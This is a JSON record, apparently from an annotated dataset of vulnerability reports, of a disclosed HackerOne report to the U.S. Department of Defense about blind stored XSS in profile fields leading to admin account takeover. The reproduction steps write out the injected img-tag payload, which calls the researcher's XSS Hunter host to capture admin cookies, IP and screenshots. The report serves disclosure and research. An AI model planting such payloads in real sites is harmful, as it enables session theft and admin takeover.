@@ -1,0 +1,46 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "hemantsolo ",
+    "title": "Blind Stored XSS on \u2588\u2588\u2588\u2588\u2588\u2588\u2588  leads to takeover admin account",
+    "content": "\nHello Team,\nI am Hemant Patidar working as a security researcher and I found a bug in your site.\nReport of bug is as follows:-\nVulnerable URL:\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\nDescription:\nI have found that various field of the profile page is not properly configured to wipe out HTML tags and Javascript code which leads to store the blind XSS payload in the first name, last name, title etc. and whenever the admin will check the profile the code will fire and we will get response in the XSS Hunter along with the screenshot of the admin side, IP and cookies and other sensitive information.\nPOC:\nXSS Hunter report attached.\nImpact\nAn attacker is able to access critical information from the admin panel. The XSS reveals the administrator\u2019s IP address, backend application service, titles of mail chimp customers and internal subscription emails, admin session cookies.\nAn attacker can exploit the above cookies to access the admin panel.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nGo to the URL by opening your account: https://\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nNow enter the below payload in the First name, last name, company name and title: data: \"><img src=\"https://hemantsolo.xss.ht>/index.html?c=hemantsolo_xss\" />\nNow wait for some time you will get an XSS fire email via XSS hunter along with the screenshot and other sensitive info.\nSuggested Mitigation/Remediation Actions\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-site Scripting (XSS) - Stored"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1615513560,
+    "report_url": "https://hackerone.com/reports/1110243",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Go to the URL by opening your account: https://\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588"
+        ],
+        [
+            2,
+            "Enter the XSS payload in the First name, last name, company name, or title fields: data: \"><img src=\"https://hemantsolo.xss.ht>/index.html?c=hemantsolo_xss\" />"
+        ],
+        [
+            3,
+            "Wait for the XSS Hunter report to be triggered when an admin views the profile, capturing sensitive information."
+        ]
+    ],
+    "vuln_description": "A Blind Stored XSS vulnerability exists in the profile fields (First name, last name, company name, title) of the target application. The application fails to properly sanitize user input, allowing an attacker to inject malicious JavaScript payloads. When an administrator views the affected profile, the payload executes in the admin's context, leaking sensitive information such as cookies, IP address, and backend details.",
+    "reason": "The vulnerability is straightforward to discover as it involves basic XSS payload testing in common input fields. The attack does not require complex interactions, state manipulation, or novel logic. The only non-trivial aspect is the blind nature of the XSS, but this is mitigated by using standard XSS Hunter tools.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "authnz_metadata": {
+        "reason": "The vulnerability involves a stored XSS that triggers when an admin views a user's profile. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, but does not explicitly cover XSS detection. However, if the XSS payload is stored in a resource (like a profile field) and the admin's session is used to view it, this could be indirectly detected by monitoring actions involving resource access with different user sessions.",
+        "is_detectable": true
+    }
+}
